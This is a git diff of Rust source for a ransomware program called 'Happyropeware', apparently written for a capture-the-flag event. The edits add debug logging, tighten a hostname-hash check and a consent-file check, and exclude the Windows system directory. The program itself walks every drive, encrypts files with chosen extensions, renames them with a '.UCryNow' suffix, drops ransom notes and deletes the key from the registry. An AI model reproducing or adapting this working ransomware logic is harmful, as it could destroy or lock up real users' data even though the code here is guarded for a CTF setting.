@@ -1,4 +1,4 @@
-#![cfg_attr(not(test), windows_subsystem = "windows")]
+#![cfg_attr(all(not(test), not(debug_assertions)), windows_subsystem = "windows")]
 
 mod cipher;
 mod key_mgmt;
@@ -7,7 +7,6 @@ use anyhow::{anyhow, bail, Result};
 use cipher::PerVictimKey;
 use single_instance::SingleInstance;
 use skip_error::{skip_error_and_debug, SkipError};
-use windows::Win32::UI::Shell::ShellExecuteW;
 use std::fs;
 use std::fs::File;
 use std::io::Write;
@@ -20,11 +19,12 @@ use widestring::U16CString;
 use windows::w;
 use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetVolumeInformationW};
 use windows::Win32::System::SystemServices::{FILE_NAMED_STREAMS, FILE_READ_ONLY_VOLUME};
+use windows::Win32::UI::Shell::ShellExecuteW;
 use windows::{Win32::System::WindowsProgramming::*, Win32::UI::WindowsAndMessaging::*};
 
-// blake3::hash(b"the-victim-host-8deb7b96")
+// blake3::hash(b"the-victim-host"); Computer name is limited to 15 characters.
 const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
-    "7e199a3cd61f888b67bbc6eb5ea707bca51b6d5af06b39c2fb038426f1a17fe5";
+    "b241392db7a4bdf3b2efc952c4b7d44dfe23c7e193fe95b2db2824e35f133a42";
 const CONSENT_MARKER_FILE_NAME: &'static str =
     "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
 const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
@@ -51,7 +51,10 @@ fn check_precondition() -> Result<()> {
     let computer_name_hash = blake3::hash(computer_name.as_bytes());
     let expected_hash: blake3::Hash = EXPECTED_COMPUTER_NAME_HASH_HEX.parse().unwrap();
     if computer_name_hash != expected_hash {
-        bail!("computer name mismatches");
+        bail!(format!(
+            "computer name mismatches: {} vs {} (name: {})",
+            computer_name_hash, expected_hash, computer_name
+        ));
     }
 
     let user_dirs = directories::UserDirs::new().unwrap();
@@ -127,12 +130,14 @@ fn is_victim_file(entry: &walkdir::DirEntry) -> bool {
     if let Some(ext) = entry.path().extension() {
         return entry.file_type().is_file()
             && entry.file_name() != RANSOM_LETTER_FILE_NAME
+            && entry.file_name() != CONSENT_MARKER_FILE_NAME
             && EXTENSION_TO_ENCRYPT.iter().any(|v| v == &ext);
     }
     return false;
 }
 
 fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
+    log::debug!("Encrypting file {:?}", path.as_ref());
     let mut new_name = path.as_ref().file_name().unwrap().to_owned();
     new_name.push(".UCryNow");
     let new_path = path.as_ref().with_file_name(&new_name);
@@ -176,16 +181,19 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
         let rx = rx.clone();
         let letter_tx = letter_tx.clone();
         let jh = thread::spawn(move || {
-            rx.iter()
-                .map(|f| encrypt_file(&f, &key).and_then(|_| letter_tx.send(f).or(Ok(()))))
-                .skip_error_and_debug();
+            for f in rx {
+                skip_error_and_debug!(encrypt_file(&f, &key));
+                skip_error_and_debug!(letter_tx.send(f));
+            }
         });
         workers.push(jh);
     }
+    drop(letter_tx);
     let letterguy = {
         let key = key.clone();
         thread::spawn(move || {
             for f in letter_rx {
+                log::trace!("Dropping ransom letter for {:?}", f);
                 if let Some(dir) = f.parent() {
                     if !dir.join(RANSOM_LETTER_FILE_NAME).exists() {
                         skip_error_and_debug!(drop_ransom_letter(&dir, &key));
@@ -194,12 +202,18 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
             }
         })
     };
+    
+    let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_owned());
     for drive in drives {
+        log::debug!("Walking drive: {:?}", drive);
         let walker = WalkDir::new(drive).same_file_system(true).into_iter();
         for entry in walker
+            .filter_entry(|e| !e.path().starts_with(&system_root))
             .skip_error()
+            .inspect(|e| { log::trace!("Walking entry: {:?}", e); })
             .filter(|e| !e.path_is_symlink() && is_victim_file(&e))
         {
+            log::debug!("Target file: {:?}", entry);
             skip_error_and_debug!(tx.send(entry.into_path()));
         }
     }
@@ -227,15 +241,25 @@ fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
 }
 
 fn main() -> Result<()> {
+    #[cfg(debug_assertions)]
+    stderrlog::new()
+        .module(module_path!())
+        .verbosity(3)
+        .init()
+        .unwrap();
     assert_precondition();
+    log::debug!("Happyropeware launched");
     let holder = SingleInstance::new("happyropeware-dc52184435e51deee395")?;
     if !holder.is_single() {
         return Ok(());
     }
+    log::debug!("Single instance acquired");
 
     let victim_key = key_mgmt::ensure_key()?;
+    log::debug!("Victim key acquired {:?}", &victim_key);
     the_boring_loop(&victim_key)?;
     key_mgmt::destroy_key()?;
+    log::debug!("Victim key removed from registry");
     try_show_ransom_letter_on_desktop(&victim_key).ok();
     Ok(())
 }
